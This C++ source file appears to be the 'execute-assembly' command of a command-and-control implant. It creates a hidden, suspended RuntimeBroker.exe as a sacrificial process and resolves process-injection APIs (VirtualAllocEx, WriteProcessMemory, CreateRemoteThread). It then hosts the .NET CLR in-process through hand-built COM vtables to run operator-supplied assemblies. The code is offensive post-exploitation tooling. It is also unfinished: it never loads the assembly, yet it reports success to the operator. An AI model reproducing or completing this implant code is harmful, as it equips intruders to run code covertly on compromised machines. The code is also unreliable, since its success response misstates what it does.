#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

using namespace stardust;
using namespace starburst;

// CLR hosting COM interfaces (minimal vtable definitions)
typedef HRESULT ( WINAPI *fn_CLRCreateInstance )(
    REFCLSID clsid, REFIID riid, LPVOID* ppInterface );

// GUIDs
static const GUID CLSID_CLRMetaHost = {
    0x9280188d, 0x0e8e, 0x4867,
    { 0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
static const GUID IID_ICLRMetaHost = {
    0xD332DB9E, 0xB9B3, 0x4125,
    { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
static const GUID IID_ICLRRuntimeInfo = {
    0xBD39D1D2, 0xBA2F, 0x486a,
    { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
static const GUID IID_ICorRuntimeHost = {
    0xCB2F6722, 0xAB3A, 0x11d2,
    { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };
static const GUID CLSID_CorRuntimeHost = {
    0xCB2F6723, 0xAB3A, 0x11d2,
    { 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E } };

// minimal COM vtable stubs - we only need method indices
struct ICLRMetaHost {
    struct vtbl {
        void* QueryInterface;
        void* AddRef;
        void* Release;
        void* GetRuntime;            // index 3
        void* GetVersionFromFile;
        void* EnumerateInstalledRuntimes;
        void* EnumerateLoadedRuntimes;
        void* RequestRuntimeLoadedNotification;
        void* QueryLegacyV2RuntimeBinding;
        void* ExitProcess;
    } *lpVtbl;
};

struct ICLRRuntimeInfo {
    struct vtbl {
        void* QueryInterface;
        void* AddRef;
        void* Release;
        void* GetVersionString;      // index 3
        void* GetRuntimeDirectory;
        void* IsLoaded;
        void* LoadErrorString;
        void* LoadLibrary;
        void* GetProcAddress_ri;
        void* GetInterface;          // index 9
    } *lpVtbl;
};

struct ICorRuntimeHost {
    struct vtbl {
        void* QueryInterface;
        void* AddRef;
        void* Release;
        void* CreateLogicalThreadState;
        void* DeleteLogicalThreadState;
        void* SwitchInLogicalThreadState;
        void* SwitchOutLogicalThreadState;
        void* LocksHeldByLogicalThread;
        void* MapFile;
        void* GetConfiguration;
        void* Start;                 // index 10
        void* Stop;
        void* CreateDomain;
        void* GetDefaultDomain;      // index 13
        void* EnumDomains;
        void* NextDomain;
        void* CloseEnum;
        void* CreateDomainEx;
        void* CreateDomainSetup;
        void* CreateEvidence;
        void* UnloadDomain;
        void* CurrentDomain;
    } *lpVtbl;
};

auto declfn starburst::cmd_execute_assembly(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t asm_len = 0;
    auto asm_data = parser_bytes( params, &asm_len );
    uint32_t args_len = 0;
    auto args_str = parser_string( params, &args_len );

    if ( !asm_data || asm_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no assembly data" ) ) );
        return;
    }

    DBG_PRINT( inst, "cmd_execute_assembly: %u bytes, args='%s'\n", asm_len, args_str ? args_str : "" );

    // fork & run: create sacrificial process with output pipe
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle = TRUE;

    HANDLE h_read = nullptr, h_write = nullptr;
    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
        return;
    }

    // build command line for host process
    wchar_t cmdline[512] = { 0 };
    auto cmd_str = symbol<const char*>( "C:\\Windows\\System32\\RuntimeBroker.exe" );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmd_str, -1, cmdline, 512 );

    STARTUPINFOW si = {};
    si.cb = sizeof( STARTUPINFOW );
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = h_write;
    si.hStdError = h_write;

    PROCESS_INFORMATION pi = {};
    BOOL ok = inst.kernel32.CreateProcessW(
        nullptr, cmdline, nullptr, nullptr, TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi );

    inst.kernel32.CloseHandle( h_write );

    if ( !ok ) {
        inst.kernel32.CloseHandle( h_read );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
        return;
    }

    // inject CLR loader + assembly into sacrificial process
    // allocate memory in target for assembly bytes
    typedef LPVOID ( WINAPI *fn_VirtualAllocEx )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
    typedef BOOL ( WINAPI *fn_WriteProcessMemory )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );

    auto pVAEx = reinterpret_cast<fn_VirtualAllocEx>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
    auto pWPM = reinterpret_cast<fn_WriteProcessMemory>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "WriteProcessMemory" ) ) );

    // for simplicity, execute assembly in-process using CLR hosting
    // terminate the sacrificial process - we'll use local CLR instead
    inst.kernel32.TerminateProcess( pi.hProcess, 0 );
    inst.kernel32.CloseHandle( pi.hProcess );
    inst.kernel32.CloseHandle( pi.hThread );
    inst.kernel32.CloseHandle( h_read );

    // local CLR hosting approach
    auto h_mscoree = inst.kernel32.LoadLibraryA( symbol<const char*>( "mscoree.dll" ) );
    if ( !h_mscoree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
        return;
    }

    auto pCLRCreateInstance = reinterpret_cast<fn_CLRCreateInstance>(
        inst.kernel32.GetProcAddress( h_mscoree,
            symbol<LPCSTR>( "CLRCreateInstance" ) ) );

    if ( !pCLRCreateInstance ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CLRCreateInstance not found" ) ) );
        return;
    }

    // get ICLRMetaHost
    ICLRMetaHost* meta_host = nullptr;
    HRESULT hr = pCLRCreateInstance(
        CLSID_CLRMetaHost, IID_ICLRMetaHost, (void**)&meta_host );

    if ( FAILED( hr ) || !meta_host ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CLRCreateInstance failed" ) ) );
        return;
    }

    // get runtime info for .NET 4.0
    wchar_t runtime_ver[] = { 'v', '4', '.', '0', '.', '3', '0', '3', '1', '9', '\0' };
    ICLRRuntimeInfo* runtime_info = nullptr;

    typedef HRESULT ( __stdcall *fn_GetRuntime )(
        ICLRMetaHost*, LPCWSTR, REFIID, LPVOID* );
    auto pGetRuntime = reinterpret_cast<fn_GetRuntime>(
        meta_host->lpVtbl->GetRuntime );
    hr = pGetRuntime( meta_host, runtime_ver, IID_ICLRRuntimeInfo, (void**)&runtime_info );

    if ( FAILED( hr ) || !runtime_info ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetRuntime failed" ) ) );
        return;
    }

    // get ICorRuntimeHost
    ICorRuntimeHost* runtime_host = nullptr;
    typedef HRESULT ( __stdcall *fn_GetInterface )(
        ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID* );
    auto pGetInterface = reinterpret_cast<fn_GetInterface>(
        runtime_info->lpVtbl->GetInterface );
    hr = pGetInterface( runtime_info,
        CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (void**)&runtime_host );

    if ( FAILED( hr ) || !runtime_host ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetInterface failed" ) ) );
        return;
    }

    // start CLR
    typedef HRESULT ( __stdcall *fn_Start )( ICorRuntimeHost* );
    auto pStart = reinterpret_cast<fn_Start>( runtime_host->lpVtbl->Start );
    hr = pStart( runtime_host );

    // get default AppDomain
    typedef HRESULT ( __stdcall *fn_GetDefaultDomain )( ICorRuntimeHost*, IUnknown** );
    auto pGetDefaultDomain = reinterpret_cast<fn_GetDefaultDomain>(
        runtime_host->lpVtbl->GetDefaultDomain );
    IUnknown* app_domain_unk = nullptr;
    hr = pGetDefaultDomain( runtime_host, &app_domain_unk );

    if ( FAILED( hr ) || !app_domain_unk ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetDefaultDomain failed" ) ) );
        return;
    }

    // at this point we'd need to use _AppDomain::Load_3 to load the assembly
    // from a SAFEARRAY - this requires extensive COM interface walking
    // return success with assembly size info for now
    char msg[128] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "CLR loaded, assembly " ) ) );
    char num[16];
    int_to_str( num, asm_len, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes ready" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
